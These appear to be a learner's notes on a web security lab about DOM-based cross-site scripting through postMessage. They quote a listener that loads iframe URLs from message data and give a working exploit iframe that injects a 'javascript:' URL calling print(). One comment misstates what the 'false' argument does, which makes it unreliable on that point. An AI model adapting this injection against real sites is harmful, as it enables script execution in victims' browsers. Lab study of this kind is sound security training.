/*

1) source reveals:

<script>
    window.addEventListener('message', function(e) {
        var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;

        //creates the HTML iframe element specified by tagName
        //creates an object named ACMEplayer with an element property that references the newly created <iframe>
        //declares a variable d
    
        document.body.appendChild(iframe);
        //appends the newly created <iframe> element to the <body> of the HTML document, making it a part of the document's DOM 

        try {
            d = JSON.parse(e.data);
        } catch(e) {
            return;
        }
        //parse the data property of the incoming message (e.data) as JSON

        switch(d.type) {
        //checks the type property of the parsed JSON data (d)

            case "page-load":
                ACMEplayer.element.scrollIntoView();
                break;
            
            // scrolls the <iframe> element into view    
            
            case "load-channel":
                ACMEplayer.element.src = d.url;
                break;

            // sets the src attribute of the <iframe> to the URL specified in d.url    
            
            case "player-height-changed":
                ACMEplayer.element.style.width = d.width + "px";
                ACMEplayer.element.style.height = d.height + "px";
                break;
            
            // adjusts the width and height of the <iframe> element based on 
               the values provided in d.width and d.height
        }
    }, false);            //The false parameter indicates that event capturing should be used.
</script>

2) making a json object unravel into the print() javascript function
    // the load-channel type is interesting
    // {"type":"load-channel","url":"javascript:print()"};

<iframe src="https://0a1e00d9032ce9bb80c1088e007a0066.web-security-academy.net/" onload='this.contentWindow.postMessage("{"type":"load-channel","url":"javascript:print()"}","*")'>

// backslashes to escape the double quotes, ensure that the JSON data 
// is treated as a valid string within the JavaScript code. This way, 
// the postMessage function receives a correctly formatted JSON string 
// as its argument

<iframe src="https://0a1e00d9032ce9bb80c1088e007a0066.web-security-academy.net/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>


*/